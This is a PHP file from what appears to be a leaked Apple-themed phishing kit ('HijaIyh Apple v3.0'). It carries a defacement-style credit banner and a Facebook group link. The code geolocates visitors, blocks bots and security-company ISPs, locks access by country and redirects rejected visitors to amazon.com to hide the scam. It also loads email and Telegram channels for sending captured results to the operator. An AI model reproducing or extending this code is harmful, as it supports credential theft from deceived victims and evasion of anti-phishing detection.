<?php
/*
    ▄▄▌  ▄▄▄ . ▄▄▄· ▄ •▄  ▄▄·       ·▄▄▄▄  ▄▄▄ .
    ██•  ▀▄.▀·▐█ ▀█ █▌▄▌▪▐█ ▌▪▪     ██▪ ██ ▀▄.▀·
    ██▪  ▐▀▀▪▄▄█▀▀█ ▐▀▀▄·██ ▄▄ ▄█▀▄ ▐█· ▐█▌▐▀▀▪▄
    ▐█▌▐▌▐█▄▄▌▐█ ▪▐▌▐█.█▌▐███▌▐█▌.▐▌██. ██ ▐█▄▄▌
    .▀▀▀  ▀▀▀  ▀  ▀ ·▀  ▀·▀▀▀  ▀█▄▀▪▀▀▀▀▀•  ▀▀▀
    FuCked By [!]DNThirTeen
    https://www.facebook.com/groups/L34K.C0de/
*/
# HijaIyh Project.
/**
* HijaIyh Apple v3.0
* @version 3.0
* @author shutdown57 < indonesianpeople.shutdown57@gmail.com >
* @copyright (c) HijaIyh Production 2019.
**/

$sfile = __DIR__.'/config/scama.iyh.json';
$rfile = __DIR__.'/config/result.iyh.json';
$dotStatus = __DIR__.'/config/.status_hijaiyh';

$IP_BULE = $core->userIP();
$_SESSION['IP_BULE'] = $IP_BULE;

if(!file_exists($dotStatus) || file_exists($dotStatus) && file_get_contents($dotStatus) != 'active')
{
	require_once(__DIR__.'/__init__HIJAIYH3.php');exit;
}

/*if($api->config()['status'] != 'live'){

	require_once(__DIR__.'/__init__HIJAIYH3.php');exit;
}*/
$test_ip = ['104.236.74.212', // US,
			'46.101.40.25', // UK,
			'198.16.78.43', // NL,
			'140.213.56.137'  // ID
		];
//shuffle($test_ip);

switch(mode){
	case 'development':
	$lc['ip'] = $test_ip[3];
	break;
	case 'production':
	$lc['ip'] = $core->userIP();
	break;
	default:
	$lc['ip'] = $core->userIP();
	break;
}
if(isset($_SESSION['country_index']) && isset($_SESSION['countryCode']) && isset($_SESSION['isp']))
{
    $lc['country'] = $_SESSION['country_index'];
    $lc['countryCode'] = $_SESSION['countryCode'];
    $lc['isp'] = $_SESSION['isp'];
}else{
$_SESSION['country_index'] = $lc['country'] = $api->country($lc['ip']);
$_SESSION['countryCode'] = $lc['countryCode'] = $api->countrycode($lc['ip']);
$_SESSION['isp'] = $lc['isp'] = $api->isp($lc['ip']);
}

if(!preg_match("/panel/",$_SERVER['REQUEST_URI'])){
$blocker->run_blocker($lc['isp']/*,array($API_URL, file_get_contents(__DIR__.'/config/.account_key'),@file_get_contents(__DIR__.'/config/.api_key'))*/);
}
$core->create_session(['country_' => $lc['country']]);

if($core->parse_hijaiyh('lc','lock_lang') == 1)
{
	$lc['lang'] = $core->parse_hijaiyh('lc','default_lang');
}else{
	$lc['lang'] = $locales->langcountry($lc['countryCode']);
}

if($core->parse_hijaiyh('lc','lock_country') == 1)
{
	if(strtolower($lc['countryCode']) != strtolower($core->parse_hijaiyh('lc','allowed_country')))
	{
		$core->stats('bot','Country blacklisted because lock country ('.$core->parse_hijaiyh('lc','allowed_country').') active | '.$lc['countryCode']);
		$core->redirect('https://href.li?https://amazon.com');
		exit;
	}
}

// aliases

$userIP = $lc['ip'];
$country_name = $lc['country'];
$locale =$lc['lang'].'_'.$lc['countryCode'];
$pirul = parse_url($_SERVER['REQUEST_URI']);
$epir = explode("=",$pirul['query']);
$skey = @$epir[1];
$localex = @$epir[2];
$clang = explode("_",$localex);
$lang = @$clang[0];
$country_code = @$clang[1];
$all_result = json_decode(@file_get_contents(__DIR__.'/config/result.iyh.json'),true);
$email_result = $all_result['result_email'];
$telegram_result = $all_result['result_telegram'];
